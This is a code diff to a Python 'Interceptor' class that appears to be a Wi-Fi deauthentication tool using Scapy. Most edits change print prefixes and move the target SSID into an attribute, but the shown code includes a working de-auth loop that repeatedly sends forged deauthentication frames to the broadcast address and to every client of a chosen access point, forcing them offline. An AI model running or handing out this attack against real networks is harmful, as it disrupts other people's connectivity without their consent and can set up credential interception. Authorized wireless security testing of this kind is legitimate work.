@@ -111,7 +111,7 @@ class Interceptor:
 
         chosen = -1
         while chosen not in target_map.keys():
-            printf(f"[*] Choose a target from {min(target_map.keys())} <-> {max(target_map.keys())}")
+            printf(f"[>] Choose a target from {min(target_map.keys())} <-> {max(target_map.keys())}")
             chosen = int(input())
 
         return target_map[chosen]
@@ -135,19 +135,19 @@ class Interceptor:
         printf(f"[*] Starting listener for new clients...")
         sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: self._abort is True)
 
-    def _run_deauther(self, target_ssid: str):
+    def _run_deauther(self):
         printf(f"[*] Starting de-auth loop...")
 
         rd_frm = RadioTap()
         deauth_frm = Dot11Deauth()
         while not self._abort:
             self.attack_loop_count += 1
-            ap_mac = self._active_aps[target_ssid]["mac_addr"]
+            ap_mac = self._active_aps[self.target_ssid]["mac_addr"]
             sendp(rd_frm /
                   Dot11(addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
                   deauth_frm,
                   iface=self.interface)  # todo broadcast works?
-            for client_mac in self._active_aps[target_ssid]["clients"]:
+            for client_mac in self._active_aps[self.target_ssid]["clients"]:
                 sendp(rd_frm /
                       Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
                       deauth_frm,
@@ -167,11 +167,11 @@ class Interceptor:
         printf(DELIM)
         try:
             while not self._abort:
-                printf(f"[+] Target SSID{self.target_ssid.rjust(80 - 15, ' ')}")
-                printf(f"[+] Channel{str(self._active_aps[self.target_ssid]['channel']).rjust(80 - 11, ' ')}")
-                printf(f"[+] MAC addr{self._active_aps[self.target_ssid]['mac_addr'].rjust(80 - 12, ' ')}")
-                printf(f"[+] Net interface{self.interface.rjust(80 - 17, ' ')}")
-                printf(f"[+] Amount clients{str(len(self._active_aps[self.target_ssid]['clients'])).rjust(80 - 18, ' ')}")
+                printf(f"[*] Target SSID{self.target_ssid.rjust(80 - 15, ' ')}")
+                printf(f"[*] Channel{str(self._active_aps[self.target_ssid]['channel']).rjust(80 - 11, ' ')}")
+                printf(f"[*] MAC addr{self._active_aps[self.target_ssid]['mac_addr'].rjust(80 - 12, ' ')}")
+                printf(f"[*] Net interface{self.interface.rjust(80 - 17, ' ')}")
+                printf(f"[*] Amount clients{str(len(self._active_aps[self.target_ssid]['clients'])).rjust(80 - 18, ' ')}")
                 sleep(self._print_res_intv)
                 clear_line(5)
         except KeyboardInterrupt:
